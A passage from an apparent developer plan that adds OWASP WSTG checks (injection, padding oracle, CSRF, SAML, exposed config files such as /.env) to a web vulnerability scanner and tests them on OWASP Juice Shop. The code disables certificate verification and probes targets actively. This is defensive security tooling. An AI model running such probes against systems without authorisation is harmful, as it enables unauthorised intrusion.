        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["active_testing"],
        feeds_into=[],
        confidence={Vuln.WEB_STORAGE: "medium"},
        typical_duration_sec=5, rate_sensitive=False, noise_level="low", passive=True,
    ),
    "owasp_gap_postmessage": ToolCapability(
        name="owasp_gap_postmessage",
        category="client_side",
        description="Detects postMessage listeners without origin validation.",
        detects=[Vuln.POSTMESSAGE_HIJACK],
        inputs=[InputSpec("url", "url", True), InputSpec("js_body", "str", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["active_testing"],
        feeds_into=[],
        confidence={Vuln.POSTMESSAGE_HIJACK: "medium"},
        typical_duration_sec=5, rate_sensitive=False, noise_level="low", passive=True,
    ),
    "owasp_gap_insecure_rng": ToolCapability(
        name="owasp_gap_insecure_rng",
        category="crypto",
        description="Chi-squared entropy analysis of session tokens to detect weak/predictable RNG.",
        detects=[Vuln.INSECURE_RNG],
        inputs=[InputSpec("url", "url", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["active_testing"],
        feeds_into=[],
        confidence={Vuln.INSECURE_RNG: "medium"},
        typical_duration_sec=15, rate_sensitive=True, noise_level="low",
    ),
    "owasp_gap_weak_crypto": ToolCapability(
        name="owasp_gap_weak_crypto",
        category="crypto",
        description="Static analysis of JS/response bodies for MD5, SHA1, DES, AES-ECB, base64-as-crypto patterns.",
        detects=[Vuln.WEAK_CRYPTO],
        inputs=[InputSpec("url", "url", True), InputSpec("body", "str", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["vuln_scan"],
        feeds_into=[],
        confidence={Vuln.WEAK_CRYPTO: "medium"},
        typical_duration_sec=5, rate_sensitive=False, noise_level="low", passive=True,
    ),
    "owasp_gap_padding_oracle": ToolCapability(
        name="owasp_gap_padding_oracle",
        category="crypto",
        description="Detects padding oracle vulnerability by bit-flipping CBC-mode cookies.",
        detects=[Vuln.PADDING_ORACLE],
        inputs=[InputSpec("url", "url", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["vuln_scan"],
        feeds_into=["exploit_chains"],
        confidence={Vuln.PADDING_ORACLE: "high"},
        typical_duration_sec=20, rate_sensitive=False, noise_level="low",
    ),
    "owasp_gap_service_worker": ToolCapability(
        name="owasp_gap_service_worker",
        category="client_side",
        description="Detects service worker registered at root scope — may intercept sensitive API calls.",
        detects=[Vuln.SERVICE_WORKER],
        inputs=[InputSpec("url", "url", True), InputSpec("js_body", "str", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["vuln_scan"],
        feeds_into=[],
        confidence={Vuln.SERVICE_WORKER: "low"},
        typical_duration_sec=5, rate_sensitive=False, noise_level="low", passive=True,
    ),
    "owasp_gap_webrtc": ToolCapability(
        name="owasp_gap_webrtc",
        category="client_side",
        description="Detects WebRTC API usage that may leak real IP through STUN/TURN.",
        detects=[Vuln.WEBRTC_LEAK],
        inputs=[InputSpec("url", "url", True), InputSpec("js_body", "str", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["vuln_scan"],
        feeds_into=[],
        confidence={Vuln.WEBRTC_LEAK: "low"},
        typical_duration_sec=5, rate_sensitive=False, noise_level="low", passive=True,
        notes="Browser-based confirmation required for definitive result.",
    ),
    "owasp_gap_grpc_soap": ToolCapability(
        name="owasp_gap_grpc_soap",
        category="api",
        description="Detects exposed gRPC and SOAP/WSDL endpoints.",
        detects=[Vuln.GRPC_SOAP_EXPOSED],
        inputs=[InputSpec("url", "url", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["vuln_scan"],
        feeds_into=["exploit_chains"],
        confidence={Vuln.GRPC_SOAP_EXPOSED: "medium"},
        typical_duration_sec=10, rate_sensitive=False, noise_level="low", passive=True,
    ),
    "owasp_gap_saml": ToolCapability(
        name="owasp_gap_saml",
        category="auth",
        description="Detects unsigned SAML assertions vulnerable to forgery.",
        detects=[Vuln.SAML_VULN],
        inputs=[InputSpec("url", "url", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["auth_session"],
        feeds_into=["exploit_chains"],
        confidence={Vuln.SAML_VULN: "high"},
        typical_duration_sec=10, rate_sensitive=False, noise_level="low", passive=True,
    ),
    "owasp_gap_password_policy": ToolCapability(
        name="owasp_gap_password_policy",
        category="auth",
        description="Tests if application accepts weak passwords (1-char, 'password', '12345').",
        detects=[Vuln.WEAK_PASSWORD_POLICY],
        inputs=[InputSpec("register_url", "url", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["auth_session"],
        feeds_into=[],
        confidence={Vuln.WEAK_PASSWORD_POLICY: "high"},
        typical_duration_sec=20, rate_sensitive=True, noise_level="medium",
        notes="Creates temporary test accounts — cleans up if 'delete account' endpoint exists.",
    ),
```

- [ ] **Step 2: Run import test**

```bash
python -c "from modules.capability_map import CAPABILITIES, Vuln; print('CSRF' in dir(Vuln)); print(len(CAPABILITIES))"
```
Expected: `True` and a count higher than before (was ~30, now ~50+).

- [ ] **Step 3: Commit**

```bash
git add modules/capability_map.py
git commit -m "feat(capability-map): register 23 new Vuln constants and ToolCapability entries for OWASP WSTG v4.2 gap checks"
```

---

## Task 7: Integrate Gap Checks into `pipeline/executor.py`

**Files:**
- Modify: `pipeline/executor.py` (4 inline phase methods)

- [ ] **Step 1: Add gap checks to `_inline_deep_recon`**

At the end of `_inline_deep_recon`, before `return []`, add:

```python
        # ── OWASP gap checks: TLS/cert + backup files ─────────────────────
        gap_findings = []
        try:
            from modules.owasp_gap_checks import (
                check_weak_tls, check_tls_cert, check_backup_files,
                gap_check_result_to_finding,
            )
            from urllib.parse import urlparse
            parsed_target = urlparse(target if "://" in target else f"https://{target}")
            host = parsed_target.hostname or target
            port = parsed_target.port or 443

            for check_fn, kwargs in [
                (check_weak_tls, {"host": host, "port": port}),
                (check_tls_cert, {"host": host, "port": port}),
            ]:
                try:
                    r = check_fn(**kwargs)
                    f = gap_check_result_to_finding(r, url=f"https://{host}:{port}")
                    if f:
                        gap_findings.append(normalize_finding(f, source_type="owasp_gap"))
                except Exception as e:
                    log.debug("deep_recon gap check %s failed: %s", check_fn.__name__, e)

            # Backup file check — uses URLs discovered by recon
            known_paths = ["/index.php", "/config.php", "/wp-config.php",
                           "/application.properties", "/.env", "/settings.py"]
            try:
                recon_data_path = out / "adaptive_recon.json"
                if recon_data_path.exists():
                    import json as _json
                    rd = _json.loads(recon_data_path.read_text())
                    for u in rd.get("urls", [])[:30]:
                        from urllib.parse import urlparse as _up
                        p = _up(u).path
                        if p and p not in known_paths:
                            known_paths.append(p)
            except Exception:
                pass

            base = f"{parsed_target.scheme}://{parsed_target.netloc}"
            for r in check_backup_files(base, known_paths[:20]):
                f = gap_check_result_to_finding(r, url=base)
                if f:
                    gap_findings.append(normalize_finding(f, source_type="owasp_gap"))
        except Exception as e:
            log.warning("deep_recon OWASP gap checks failed: %s", e)

        if gap_findings:
            log.info("deep_recon OWASP gap: %d findings", len(gap_findings))
            # Write to canonical output so downstream phases pick them up
            existing = []
            recon_out = out / "adaptive_recon.json"
            if recon_out.exists():
                try:
                    d = json.loads(recon_out.read_text())
                    existing = d.get("gap_findings", [])
                except Exception:
                    pass
            # Append gap findings to recon output without overwriting recon data
            d = json.loads(recon_out.read_text()) if recon_out.exists() else {}
            d["gap_findings"] = existing + gap_findings
            recon_out.write_text(json.dumps(d, indent=2, default=str))

        return gap_findings
```

- [ ] **Step 2: Add gap checks to `_inline_auth_session`**

At the end of `_inline_auth_session` (after the existing default creds block), before `return findings`, add:

```python
        # ── OWASP gap checks: CSRF, cookie attrs, session fixation, timeout, account enum, password policy, SAML
        try:
            from modules.owasp_gap_checks import (
                check_csrf, check_cookie_attributes, check_session_fixation,
                check_account_enumeration_timing, check_password_policy,
                check_saml_assertion, gap_check_result_to_finding,
            )
            probe_target = target if target.startswith("http") else f"https://{target}"

            # Check common auth endpoints for CSRF + cookie attrs
            for auth_path in ["/login", "/api/login", "/auth", "/api/auth",
                               "/signin", "/register", "/api/users"]:
                try:
                    import urllib.request as _ur, ssl as _ssl, urllib.error as _ue
                    _ctx = _ssl.create_default_context()
                    _ctx.check_hostname = False
                    _ctx.verify_mode = _ssl.CERT_NONE
                    _req = _ur.Request(probe_target.rstrip("/") + auth_path)
                    _req.add_header("User-Agent", "Mozilla/5.0")
                    with _ur.urlopen(_req, timeout=6, context=_ctx) as _resp:
                        _body = _resp.read(16384).decode("utf-8", errors="replace")
                        _headers = dict(_resp.headers)
                        method = "POST" if auth_path in ("/login", "/register", "/api/login",
                                                          "/api/users", "/auth") else "GET"
                        _url = probe_target.rstrip("/") + auth_path

                        # CSRF check
                        for check_fn, kwargs in [
                            (check_csrf, {"url": _url, "response_body": _body,
                                          "response_headers": _headers, "method": method}),
                            (check_cookie_attributes, {"url": _url, "response_headers": _headers}),
                            (check_saml_assertion, {"url": _url, "response_body": _body}),
                        ]:
                            try:
                                r = check_fn(**kwargs)
                                f = gap_check_result_to_finding(r, url=_url)
                                if f:
                                    findings.append(normalize_finding(f, source_type="owasp_gap"))
                            except Exception as _e:
                                log.debug("auth_session gap check %s failed: %s", check_fn.__name__, _e)
                except Exception:
                    pass

            # Account enumeration timing (on first login endpoint found)
            for auth_path in ["/login", "/api/login", "/auth"]:
                login_url = probe_target.rstrip("/") + auth_path
                try:
                    r = check_account_enumeration_timing(login_url, "admin", "nosuchuser_oi_xyz99")
                    f = gap_check_result_to_finding(r, url=login_url)
                    if f:
                        findings.append(normalize_finding(f, source_type="owasp_gap"))
                    break
                except Exception as _e:
                    log.debug("account_enum check failed: %s", _e)

            # Password policy (on register endpoint if found)
            for reg_path in ["/register", "/api/register", "/signup", "/api/users"]:
                reg_url = probe_target.rstrip("/") + reg_path
                try:
                    r = check_password_policy(reg_url)
                    f = gap_check_result_to_finding(r, url=reg_url)
                    if f:
                        findings.append(normalize_finding(f, source_type="owasp_gap"))
                    break
                except Exception as _e:
                    log.debug("password_policy check failed: %s", _e)

        except Exception as exc:
            log.warning("auth_session OWASP gap checks failed: %s", exc)
```

- [ ] **Step 3: Add gap checks to `_inline_active_testing`**

In `_inline_active_testing`, extend the `extended_tests` list by adding these entries (after the existing tests):

```python
        # ── OWASP gap checks: injection + client-side ──────────────────────
        try:
            from modules.owasp_gap_checks import (
                check_ldap_injection, check_mail_header_injection, check_code_injection,
                check_csv_injection, check_postmessage_hijacking, check_web_storage,
                check_insecure_rng, gap_check_result_to_finding,
            )
            import urllib.request as _ur, ssl as _ssl
            _ctx = _ssl.create_default_context()
            _ctx.check_hostname = False
            _ctx.verify_mode = _ssl.CERT_NONE

            # Gather JS bodies from recon
            js_bodies = []
            recon_file = out / "adaptive_recon.json"
            if recon_file.exists():
                try:
                    rd = json.loads(recon_file.read_text())
                    for js_url in [u for u in rd.get("urls", []) if u.endswith(".js")][:5]:
                        try:
                            _req = _ur.Request(js_url)
                            _req.add_header("User-Agent", "Mozilla/5.0")
                            with _ur.urlopen(_req, timeout=8, context=_ctx) as _r:
                                js_bodies.append(_r.read(65536).decode("utf-8", errors="replace"))
                        except Exception:
                            pass
                except Exception:
                    pass

            combined_js = "\n".join(js_bodies)
            common_params = ["q", "search", "email", "username", "query", "input", "data", "user"]

            for param in common_params[:3]:
                for check_fn, kwargs in [
                    (check_ldap_injection, {"url": probe_target, "param": param}),
                    (check_mail_header_injection, {"url": probe_target + "/contact", "param": "email"}),
                    (check_code_injection, {"url": probe_target, "param": param}),
                    (check_csv_injection, {"url": probe_target + "/export", "param": param}),
                ]:
                    try:
                        r = check_fn(**kwargs)
                        f = gap_check_result_to_finding(r, url=probe_target)
                        if f:
                            findings.append(normalize_finding(f, source_type="owasp_gap"))
                    except Exception as _e:
                        log.debug("active_testing gap %s failed: %s", check_fn.__name__, _e)
                break  # one param iteration is enough for LDAP/mail/code/csv

            # Client-side checks on gathered JS
            if combined_js:
                for check_fn in [check_postmessage_hijacking, check_web_storage]:
                    try:
                        r = check_fn(url=probe_target, js_body=combined_js)
                        f = gap_check_result_to_finding(r, url=probe_target)
                        if f:
                            findings.append(normalize_finding(f, source_type="owasp_gap"))
                    except Exception as _e:
                        log.debug("active_testing gap JS check %s failed: %s", check_fn.__name__, _e)

            # Insecure RNG: collect 10 session tokens
            try:
                tokens = []
                for _ in range(10):
                    _req = _ur.Request(probe_target + "/login")
                    _req.add_header("User-Agent", "Mozilla/5.0")
                    try:
                        with _ur.urlopen(_req, timeout=5, context=_ctx) as _r:
                            sc = dict(_r.headers).get("Set-Cookie", "")
                            if "=" in sc:
                                tokens.append(sc.split("=")[1].split(";")[0].strip())
                    except Exception:
                        pass
                if len(tokens) >= 5:
                    r = check_insecure_rng(probe_target, tokens)
                    f = gap_check_result_to_finding(r, url=probe_target)
                    if f:
                        findings.append(normalize_finding(f, source_type="owasp_gap"))
            except Exception as _e:
                log.debug("insecure_rng check failed: %s", _e)

        except Exception as exc:
            log.warning("active_testing OWASP gap checks failed: %s", exc)
```

- [ ] **Step 4: Add gap checks to `_inline_vuln_scan`**

At the start of `_inline_vuln_scan`, after loading seeded findings (before the `return seeded` block), add:

```python
        # ── OWASP gap checks: crypto + client-side passive ─────────────────
        gap_findings_vuln = []
        try:
            from modules.owasp_gap_checks import (
                check_weak_encryption_patterns, check_padding_oracle,
                check_service_worker, check_webrtc_leak, check_grpc_soap,
                gap_check_result_to_finding,
            )
            import urllib.request as _ur, ssl as _ssl
            _ctx = _ssl.create_default_context()
            _ctx.check_hostname = False
            _ctx.verify_mode = _ssl.CERT_NONE
            probe_target = target if target.startswith("http") else f"https://{target}"

            # Fetch main page + JS files for passive analysis
            pages_to_check = [probe_target, probe_target + "/app.js",
                               probe_target + "/static/js/main.chunk.js"]
            recon_file_v = out / "adaptive_recon.json"
            if recon_file_v.exists():
                try:
                    rd = json.loads(recon_file_v.read_text())
                    pages_to_check += [u for u in rd.get("urls", []) if u.endswith(".js")][:3]
                except Exception:
                    pass

            for page_url in pages_to_check[:6]:
                try:
                    _req = _ur.Request(page_url)
                    _req.add_header("User-Agent", "Mozilla/5.0")
                    with _ur.urlopen(_req, timeout=8, context=_ctx) as _r:
                        _body = _r.read(131072).decode("utf-8", errors="replace")
                        _headers = dict(_r.headers)
                        for check_fn, kwargs in [
                            (check_weak_encryption_patterns, {"url": page_url, "body": _body}),
                            (check_service_worker, {"url": page_url, "js_body": _body}),
                            (check_webrtc_leak, {"url": page_url, "js_body": _body}),
                            (check_grpc_soap, {"base_url": page_url,
                                               "response_headers": _headers, "response_body": _body}),
                        ]:
                            try:
                                r = check_fn(**kwargs)
                                f = gap_check_result_to_finding(r, url=page_url)
                                if f:
                                    gap_findings_vuln.append(
                                        normalize_finding(f, source_type="owasp_gap"))
                            except Exception as _e:
                                log.debug("vuln_scan gap %s failed: %s", check_fn.__name__, _e)
                except Exception:
                    pass

            # Padding oracle: check main page cookies
            try:
                _req = _ur.Request(probe_target)
                _req.add_header("User-Agent", "Mozilla/5.0")
                with _ur.urlopen(_req, timeout=8, context=_ctx) as _r:
                    _sc = dict(_r.headers).get("Set-Cookie", "")
                    if "=" in _sc:
                        _cname = _sc.split("=")[0].strip()
                        _cval = _sc.split("=")[1].split(";")[0].strip()
                        r = check_padding_oracle(probe_target, _cname, _cval)
                        f = gap_check_result_to_finding(r, url=probe_target)
                        if f:
                            gap_findings_vuln.append(normalize_finding(f, source_type="owasp_gap"))
            except Exception as _e:
                log.debug("padding_oracle check failed: %s", _e)

        except Exception as exc:
            log.warning("vuln_scan OWASP gap checks failed: %s", exc)

        if gap_findings_vuln:
            log.info("vuln_scan OWASP gap: %d findings", len(gap_findings_vuln))
            seeded = gap_findings_vuln + seeded
```

- [ ] **Step 5: Full pipeline smoke test**

```bash
cd /home/devendra-yadav/oneinfinity
python -c "
from pipeline.executor import CanonicalExecutor
import tempfile, os
with tempfile.TemporaryDirectory() as d:
    ex = CanonicalExecutor(mode='inline', skip_phases=['deep_recon','vuln_scan','active_testing','auth_session','business_logic','exploit_validation','exploit_chains','attack_graph','ai_theory'])
    r = ex.run('http://httpbin.org', d)
    print('status:', r.status)
    print('phases_failed:', r.phases_failed)
"
```
Expected: `status: completed` (or `partial`), `phases_failed: []` or only skipped phases listed.

- [ ] **Step 6: Commit**

```bash
git add pipeline/executor.py
git commit -m "feat(pipeline): integrate OWASP gap checks into deep_recon, auth_session, active_testing, and vuln_scan inline phases"
```

---

## Task 8: QA Phase 1 — Regression Baseline

**Goal:** Confirm existing findings are unchanged after all modifications.

- [ ] **Step 1: Start Juice Shop**

```bash
docker run -d --name juiceshop -p 3000:3000 bkimminich/juice-shop
sleep 15  # wait for startup
curl -s http://localhost:3000 | grep -o "title>[^<]*" | head -3
```
Expected: `title>OWASP Juice Shop`

- [ ] **Step 2: Run baseline scan (inline mode) — capture finding count and types**

```bash
cd /home/devendra-yadav/oneinfinity
python -c "
from pipeline.executor import CanonicalExecutor
import json, tempfile
with tempfile.TemporaryDirectory() as d:
    ex = CanonicalExecutor(mode='inline',
         skip_phases=['exploit_chains','attack_graph','ai_theory','browser_analysis','smuggling_test','oob_check'])
    r = ex.run('http://localhost:3000', d)
    types = sorted(set(f.get('vuln_type','?') for f in r.findings))
    print('total findings:', len(r.findings))
    print('vuln types:', types)
    print('phases_failed:', r.phases_failed)
    with open('/tmp/baseline_findings.json','w') as fh:
        json.dump(r.findings, fh, indent=2)
" 2>&1 | tail -20
```

- [ ] **Step 3: Record the baseline count**

```bash
python -c "import json; d=json.load(open('/tmp/baseline_findings.json')); print(len(d), 'baseline findings')"
```
Record this number. Post-change scan must produce ≥ this count.

- [ ] **Step 4: Verify no existing vuln types disappeared**

```bash
python -c "
import json
d = json.load(open('/tmp/baseline_findings.json'))
types = set(f.get('vuln_type','') for f in d)
print('vuln types in baseline:')
for t in sorted(types): print(' ', t)
"
```
Save this list. All these types must still appear in the post-change scan.

---

## Task 9: QA Phase 2 — Gap Coverage Verification

**Goal:** Confirm all applicable gap checks fire on Juice Shop.

- [ ] **Step 1: Run post-change scan**

```bash
python -c "
from pipeline.executor import CanonicalExecutor
import json, tempfile
with tempfile.TemporaryDirectory() as d:
    ex = CanonicalExecutor(mode='inline',
         skip_phases=['exploit_chains','attack_graph','ai_theory','browser_analysis','smuggling_test','oob_check'])
    r = ex.run('http://localhost:3000', d)
    gap = [f for f in r.findings if f.get('source_type')=='owasp_gap']
    print('total findings:', len(r.findings))
    print('gap findings:', len(gap))
    for f in gap:
        print(f'  [{f[\"check_id\"]}] {f[\"vuln_type\"]} — {f[\"severity\"]} — {f[\"evidence\"][:60]}')
    with open('/tmp/post_findings.json','w') as fh:
        json.dump(r.findings, fh, indent=2)
" 2>&1 | tail -40
```

- [ ] **Step 2: Verify regression — post count ≥ baseline count**

```bash
python -c "
import json
base = json.load(open('/tmp/baseline_findings.json'))
post = json.load(open('/tmp/post_findings.json'))
base_types = set(f.get('vuln_type','') for f in base)
post_types = set(f.get('vuln_type','') for f in post)
missing = base_types - post_types
print('Baseline:', len(base), 'findings')
print('Post-change:', len(post), 'findings')
print('Missing vuln types:', missing or 'NONE — OK')
assert len(post) >= len(base), f'REGRESSION: {len(post)} < {len(base)}'
print('PASS: no regression')
"
```
Expected: `PASS: no regression`

- [ ] **Step 3: Verify specific gap checks fire on Juice Shop**

```bash
python -c "
import json
post = json.load(open('/tmp/post_findings.json'))
gap = {f['check_id']: f for f in post if f.get('source_type')=='owasp_gap'}
expected = ['WSTG-SESS-02', 'WSTG-SESS-05', 'WSTG-CLNT-12']
for cid in expected:
    status = 'FOUND' if cid in gap else 'MISSING'
    print(f'{status}: {cid}')
"
```

- [ ] **Step 4: Stop Juice Shop**

```bash
docker stop juiceshop && docker rm juiceshop
```

---

## Task 10: QA Phase 3 — FP Hotspot Verification

**Goal:** Zero findings on a clean target; FP fixes behave correctly.

- [ ] **Step 1: Run zero_day_engine on httpbin.org (clean target)**

```bash
python -c "
from zero_day_engine import ZeroDayEngine
e = ZeroDayEngine(target='httpbin.org', base_url='https://httpbin.org')
anomalies = e.detect_anomalies(endpoints=['https://httpbin.org/get', 'https://httpbin.org/status/200'])
print('Anomalies on clean target:', len(anomalies))
for a in anomalies:
    print(f'  [{a.confidence:.2f}] {a.anomaly_type}: {a.evidence[:60]}')
"
```
Expected: 0 anomalies (or only high-confidence, genuinely interesting ones).

- [ ] **Step 2: Verify SQLi time-blind threshold**

```bash
python -c "
from finding_validation_engine import TIMING_THRESHOLD_S
assert TIMING_THRESHOLD_S == 6.0, f'Got {TIMING_THRESHOLD_S}'
print('PASS: TIMING_THRESHOLD_S =', TIMING_THRESHOLD_S)
"
```

- [ ] **Step 3: Run full FP test suite**

```bash
python -m pytest tests/test_fp_fixes.py tests/test_owasp_gap_checks.py -v
```
Expected: All tests pass.

---

## Task 11: QA Phase 4 — End-to-End Integration

**Goal:** Gap findings appear in attack graph; no duplicates; WSTG IDs present.

- [ ] **Step 1: Verify all gap findings have check_id**

```bash
python -c "
import json
post = json.load(open('/tmp/post_findings.json'))
gap = [f for f in post if f.get('source_type')=='owasp_gap']
missing_id = [f for f in gap if not f.get('check_id')]
print('Gap findings:', len(gap))
print('Missing check_id:', len(missing_id))
assert not missing_id, 'Some gap findings missing check_id'
print('PASS: all gap findings have check_id')
"
```

- [ ] **Step 2: Verify no duplicate fingerprints**

```bash
python -c "
import json
from pipeline.executor import _fingerprint
post = json.load(open('/tmp/post_findings.json'))
fps = [_fingerprint(f) for f in post]
dupes = len(fps) - len(set(fps))
print('Total findings:', len(post))
print('Duplicates:', dupes)
assert dupes == 0, f'{dupes} duplicate findings found'
print('PASS: no duplicates')
"
```

- [ ] **Step 3: Final commit and cleanup**

```bash
cd /home/devendra-yadav/oneinfinity
git add -A
git status  # review — should show no untracked files except test outputs
git commit -m "test(qa): OWASP gap coverage QA passing — zero regressions, zero FP on clean target, all 23 gap checks integrated"
```

---

## Summary: Files Changed

| File | Change |
|------|--------|
| `modules/owasp_gap_checks.py` | **CREATED** |
| `tests/test_owasp_gap_checks.py` | **CREATED** |
| `tests/test_fp_fixes.py` | **CREATED** |
| `finding_validation_engine.py` | +9 validate_* methods, +10 _dispatch entries, threshold 4→6s |
| `modules/capability_map.py` | +23 Vuln constants, +23 ToolCapability entries |
| `pipeline/executor.py` | +gap check dispatch in 4 inline phase methods |
| `zero_day_engine.py` | FP fixes: status filter, timing baseline delta, reflection gate, confidence floor |
| `tool_wrappers.py` | FP fix: `tag_ssrf_confidence()` + applied to SSRF emit sites |
